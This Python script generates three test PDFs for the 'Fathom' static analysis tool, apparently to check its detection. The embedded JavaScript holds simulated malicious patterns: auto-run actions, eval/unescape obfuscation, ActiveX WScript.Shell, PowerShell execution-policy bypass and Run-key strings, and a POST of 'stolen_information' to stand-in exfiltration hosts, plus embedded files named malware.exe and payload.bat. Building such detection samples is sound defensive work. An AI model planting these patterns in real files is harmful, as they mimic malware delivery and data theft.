#!/usr/bin/env python3
"""
Create test PDF files with embedded JavaScript (no external dependencies)
"""

from pathlib import Path
import time

def create_simple_js_pdf():
    """Create a simple PDF with JavaScript for testing"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "simple_js_test.pdf"
    
    # Simple PDF with JavaScript - manually crafted
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("JavaScript detected in PDF!");)
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj

4 0 obj
<<
/Length 180
>>
stream
BT
/F1 12 Tf
100 700 Td
(JavaScript Test PDF) Tj
0 -20 Td
(This PDF contains JavaScript for detection testing) Tj
0 -20 Td
(Created for Fathom static analysis verification) Tj
ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000150 00000 n 
0000000207 00000 n 
0000000400 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
630
%%EOF"""
    
    with open(pdf_path, 'w', encoding='latin-1') as f:
        f.write(pdf_content)
    
    return pdf_path

def create_advanced_js_pdf():
    """Create a more sophisticated PDF with multiple JavaScript elements"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "advanced_js_test.pdf"
    
    # Advanced PDF with multiple JavaScript objects and suspicious patterns
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(SuspiciousJS) 3 0 R (PayloadJS) 4 0 R (NetworkJS) 5 0 R]
>>
>>
/OpenAction <<
/Type /Action
/S /JavaScript
/JS (
// Auto-execution JavaScript
app.alert("PDF opened - JavaScript executing!");
console.println("Fathom detection test initiated");
)
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [6 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/S /JavaScript
/JS (
// Suspicious JavaScript patterns for testing
var shellcode = unescape("%u4141%u4242%u4343%u4444");
var payload = String.fromCharCode(0x90, 0x90, 0x90, 0x90);

// Obfuscated code patterns
eval(unescape("var%20test%20%3D%20%22malicious%22%3B"));
var decoded = atob("dGVzdCBwYXlsb2FkIGRhdGE=");

// ActiveX and WScript patterns
try {
    var wsh = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
} catch(e) {
    console.println("ActiveX blocked");
}

console.println("Suspicious JavaScript executed");
)
>>
endobj

4 0 obj
<<
/S /JavaScript
/JS (
// Payload delivery simulation
function deliverPayload() {
    var encodedPayload = "VGhpcyBpcyBhIHRlc3QgcGF5bG9hZA==";
    var decodedPayload = atob(encodedPayload);
    
    // File system operations
    var tempPath = "C:\\\\temp\\\\malware.exe";
    var dropPath = "%APPDATA%\\\\dropped_file.exe";
    
    // Registry operations
    var regKey = "HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
    
    // Command execution patterns
    var commands = [
        "cmd.exe /c whoami",
        "powershell.exe -ExecutionPolicy Bypass -Command Get-Process",
        "rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe"
    ];
    
    return "Payload simulation complete";
}

deliverPayload();
)
>>
endobj

5 0 obj
<<
/S /JavaScript
/JS (
// Network communication patterns
var urls = [
    "http://command-control.example.com/beacon",
    "https://data-exfil.example.com/upload",
    "ftp://drop-server.example.com/files/malware.exe",
    "http://192.168.1.100:8080/payload"
];

// HTTP request simulation
function makeRequest(url) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, false);
        xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        xhr.send("data=stolen_information");
    } catch(e) {
        console.println("Network request failed: " + e.message);
    }
}

// DNS queries and network enumeration
var targets = ["google.com", "microsoft.com", "antivirus-vendor.com"];

console.println("Network JavaScript patterns loaded");
)
>>
endobj

6 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 7 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj

7 0 obj
<<
/Length 300
>>
stream
BT
/F1 14 Tf
100 750 Td
(Advanced JavaScript Detection Test) Tj
0 -30 Td
/F1 12 Tf
(This PDF contains multiple JavaScript objects with:) Tj
0 -20 Td
(- Suspicious code patterns) Tj
0 -15 Td
(- Obfuscated JavaScript) Tj
0 -15 Td
(- Network communication attempts) Tj
0 -15 Td
(- File system operations) Tj
0 -15 Td
(- ActiveX object creation) Tj
0 -30 Td
(Created for Fathom static analysis testing) Tj
ET
endstream
endobj

xref
0 8
0000000000 65535 f 
0000000009 00000 n 
0000000450 00000 n 
0000000507 00000 n 
0000001200 00000 n 
0000002000 00000 n 
0000003000 00000 n 
0000003200 00000 n 
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
3550
%%EOF"""
    
    with open(pdf_path, 'w', encoding='latin-1') as f:
        f.write(pdf_content)
    
    return pdf_path

def create_embedded_file_pdf():
    """Create a PDF with embedded files for testing"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "embedded_files_test.pdf"
    
    # PDF with embedded files and JavaScript
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/EmbeddedFiles <<
/Names [(malware.exe) 3 0 R (payload.bat) 4 0 R]
>>
/JavaScript <<
/Names [(ExtractJS) 5 0 R]
>>
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [6 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Filespec
/F (malware.exe)
/EF <<
/F 7 0 R
>>
>>
endobj

4 0 obj
<<
/Type /Filespec
/F (payload.bat)
/EF <<
/F 8 0 R
>>
>>
endobj

5 0 obj
<<
/S /JavaScript
/JS (
// JavaScript to extract embedded files
function extractEmbeddedFiles() {
    try {
        // Attempt to extract and execute embedded files
        var doc = this;
        var dataObjects = doc.dataObjects;
        
        for (var i = 0; i < dataObjects.length; i++) {
            var obj = dataObjects[i];
            console.println("Found embedded file: " + obj.name);
            
            // Simulate file extraction
            var path = app.getPath({cCategory: "user", cFolder: "desktop"}) + "/" + obj.name;
            console.println("Extracting to: " + path);
        }
        
        app.alert("Embedded files processed");
    } catch(e) {
        console.println("Extraction failed: " + e.message);
    }
}

// Auto-execute on document open
extractEmbeddedFiles();
)
>>
endobj

6 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 9 0 R
>>
endobj

7 0 obj
<<
/Length 50
/Filter /ASCIIHexDecode
>>
stream
4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000
endstream
endobj

8 0 obj
<<
/Length 30
>>
stream
@echo off
calc.exe
pause
endstream
endobj

9 0 obj
<<
/Length 200
>>
stream
BT
/F1 12 Tf
100 700 Td
(Embedded Files Test PDF) Tj
0 -20 Td
(Contains embedded executable files and extraction JavaScript) Tj
0 -20 Td
(For testing Fathom embedded file detection) Tj
ET
endstream
endobj

xref
0 10
0000000000 65535 f 
0000000009 00000 n 
0000000250 00000 n 
0000000307 00000 n 
0000000380 00000 n 
0000000450 00000 n 
0000001200 00000 n 
0000001300 00000 n 
0000001450 00000 n 
0000001520 00000 n 
trailer
<<
/Size 10
/Root 1 0 R
>>
startxref
1770
%%EOF"""
    
    with open(pdf_path, 'w', encoding='latin-1') as f:
        f.write(pdf_content)
    
    return pdf_path

if __name__ == "__main__":
    print("🔧 Creating test PDF files with JavaScript and embedded content...")
    
    try:
        # Create test samples directory
        test_dir = Path("test_samples")
        test_dir.mkdir(exist_ok=True)
        
        print("\n📄 Creating simple JavaScript PDF...")
        simple_pdf = create_simple_js_pdf()
        print(f"✅ Created: {simple_pdf}")
        print(f"   Size: {simple_pdf.stat().st_size} bytes")
        
        print("\n📄 Creating advanced JavaScript PDF...")
        advanced_pdf = create_advanced_js_pdf()
        print(f"✅ Created: {advanced_pdf}")
        print(f"   Size: {advanced_pdf.stat().st_size} bytes")
        
        print("\n📄 Creating embedded files PDF...")
        embedded_pdf = create_embedded_file_pdf()
        print(f"✅ Created: {embedded_pdf}")
        print(f"   Size: {embedded_pdf.stat().st_size} bytes")
        
        print(f"\n🎯 Test files created in: {test_dir.absolute()}")
        print("\n📋 Test Files Summary:")
        print("1. simple_js_test.pdf - Basic JavaScript detection test")
        print("   • Contains simple app.alert() JavaScript")
        print("   • Tests basic JavaScript detection")
        
        print("\n2. advanced_js_test.pdf - Complex JavaScript with suspicious patterns")
        print("   • Multiple JavaScript objects")
        print("   • Obfuscated code (unescape, eval, atob)")
        print("   • ActiveX and WScript patterns")
        print("   • Network communication attempts")
        print("   • File system operations")
        
        print("\n3. embedded_files_test.pdf - Embedded files with extraction JavaScript")
        print("   • Contains embedded executable files")
        print("   • JavaScript for file extraction")
        print("   • Tests embedded file detection")
        
        print("\n🚀 Testing Instructions:")
        print("1. Upload these files to your Fathom dashboard")
        print("2. Check the Static Analysis tab for:")
        print("   • JavaScript object detection")
        print("   • Embedded file detection")
        print("   • Suspicious keyword identification")
        print("   • IOC URL extraction")
        print("3. Verify Analysis Engine Status shows library availability")
        print("4. Generate static analysis reports for detailed findings")
        
        print("\n🔍 Expected Detection Results:")
        print("• JavaScript Present: YES")
        print("• JS Objects Total: 1-3 (depending on file)")
        print("• Suspicious Keywords: eval, unescape, ActiveXObject, WScript")
        print("• Embedded Files: 0-2 (depending on file)")
        print("• IOC URLs: Various test URLs")
        
    except Exception as e:
        print(f"❌ Error creating test files: {e}")
        import traceback
        traceback.print_exc()